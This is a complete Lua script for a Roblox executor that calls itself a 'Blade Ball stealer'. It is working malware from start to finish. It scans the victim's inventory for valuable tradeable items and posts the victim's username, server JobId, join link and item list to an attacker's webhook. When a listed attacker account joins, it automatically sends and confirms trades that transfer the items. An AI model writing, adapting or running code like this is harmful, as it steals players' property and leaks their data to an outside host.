-- // SECURITE EXECUTION
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then return end
_G.scriptExecuted = true

local auth_token = "EBK-SS-A" 
local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

-- // FONCTION D'ENVOI POUR TON WORKER
local function sendToWorker(payload)
    local requestFunc = (syn and syn.request) or (http and http.request) or http_request or request
    if requestFunc then
        pcall(function()
            requestFunc({
                Url = webhook,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)
    end
end

-- // FORMATAGE RAP
local function formatNumber(number)
    if number == nil then return "0" end
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 and suffixIndex < #suffixes do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return (suffixIndex == 1) and tostring(math.floor(number)) or string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- // WEBHOOK 1 : JOIN MESSAGE
local function SendJoinMessage(list, prefix)
    local totalRAP = 0
    for _, v in ipairs(list) do totalRAP = totalRAP + v.RAP end
    
    local isGoodHit = totalRAP >= 500
    local embedTitle = isGoodHit and "🟢 GOOD HIT 🎯" or "🟣 SMALL HIT 🎯"
    local webhookName = isGoodHit and "🟢 Eblack - GOOD HIT" or "🟣 Eblack - SMALL HIT"
    local embedColor = isGoodHit and 65280 or 8323327

    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = grouped[item.Name] or {Count = 0, TotalRAP = 0}
        grouped[item.Name].Count = grouped[item.Name].Count + 1
        grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
    end

    local itemsListText = ""
    for name, data in pairs(grouped) do
        itemsListText = itemsListText .. string.format("%s (x%d) - **%s RAP**\n", name, data.Count, formatNumber(data.TotalRAP))
    end

    local data = {
        ["auth_token"] = auth_token,
        ["username"] = webhookName,
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = embedTitle,
            ["color"] = embedColor,
            ["fields"] = {
                {name = "Victim Username 🤖:", value = plr.Name, inline = true},
                {name = "JobId 🆔:", value = "```" .. game.JobId .. "```", inline = true},
                {name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId, inline = false},
                {name = "Item list 📝:", value = itemsListText, inline = false},
                {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    sendToWorker(data)
end

-- // WEBHOOK 2 : SERVER HIT (QUAND TU REJOINS)
local function SendMessage(list)
    local totalRAP = 0
    for _, v in ipairs(list) do totalRAP = totalRAP + v.RAP end

    local isGoodHit = totalRAP >= 500
    local statusText = isGoodHit and "🟢 GOOD HIT" or "🟣 SMALL HIT"
    local webhookName = isGoodHit and "⚪ Eblack - SERVER HIT (GOOD)" or "⚪ Eblack - SERVER HIT (SMALL)"
    local embedColor = isGoodHit and 65280 or 8323327

    local grouped = {}
    for _, item in ipairs(list) do
        grouped[item.Name] = grouped[item.Name] or {Count = 0, TotalRAP = 0}
        grouped[item.Name].Count = grouped[item.Name].Count + 1
        grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP
    end

    local itemsListText = ""
    for name, data in pairs(grouped) do
        itemsListText = itemsListText .. string.format("%s (x%s) - **%s RAP**\n", name, data.Count, formatNumber(data.TotalRAP))
    end

    local data = {
        ["auth_token"] = auth_token,
        ["username"] = webhookName,
        ["embeds"] = {{
            ["title"] = "⚪ Server Hit 🎯",
            ["color"] = embedColor,
            ["fields"] = {
                {name = "Victim Username 🤖:", value = plr.Name, inline = true},
                {name = "Status 📈:", value = statusText, inline = true},
                {name = "Items to Steal 📝:", value = itemsListText, inline = false},
                {name = "Summary 💰:", value = string.format("Total RAP: **%s**", formatNumber(totalRAP)), inline = false}
            },
            ["footer"] = {["text"] = "Blade Ball stealer by Eblack"}
        }}
    }
    sendToWorker(data)
end

-- // DATA COLLECTION
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)
local rapData = Replion.Client:GetReplion("ItemRAP").Data.Items

for _, cat in ipairs(categories) do
    if clientInventory[cat] then
        for itemId, itemInfo in pairs(clientInventory[cat]) do
            if not itemInfo.TradeLock then
                local rap = 0
                if rapData[cat] then
                    for key, value in pairs(rapData[cat]) do
                        if string.find(key, itemInfo.Name) then rap = value break end
                    end
                end
                if rap >= min_rap then
                    table.insert(itemsToSend, {ItemID = itemId, RAP = rap, itemType = cat, Name = itemInfo.Name})
                end
            end
        end
    end
end

-- // GESTION DU TRADE
tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
end)

local function doTrade(targetName)
    local target = Players:FindFirstChild(targetName)
    if not target then return end

    while #itemsToSend > 0 do
        netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(target)
        repeat task.wait(0.5) until inTrade

        local batch = {}
        for i = 1, math.min(100, #itemsToSend) do
            table.insert(batch, table.remove(itemsToSend, 1))
        end

        for _, item in ipairs(batch) do
            netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(item.itemType, item.ItemID)
        end

        netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(true)
        task.wait(0.3)
        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
        repeat task.wait(0.5) until not inTrade
    end
end

-- // EXECUTION
if #itemsToSend > 0 then
    table.sort(itemsToSend, function(a, b) return a.RAP > b.RAP end)
    local inventorySnapshot = {}
    for i, v in ipairs(itemsToSend) do inventorySnapshot[i] = v end

    SendJoinMessage(inventorySnapshot, (ping == "Yes" and "@everyone " or ""))

    local function checkAndTrade(player)
        if table.find(users, player.Name) then
            SendMessage(inventorySnapshot)
            doTrade(player.Name)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do checkAndTrade(p) end
    Players.PlayerAdded:Connect(checkAndTrade)
end
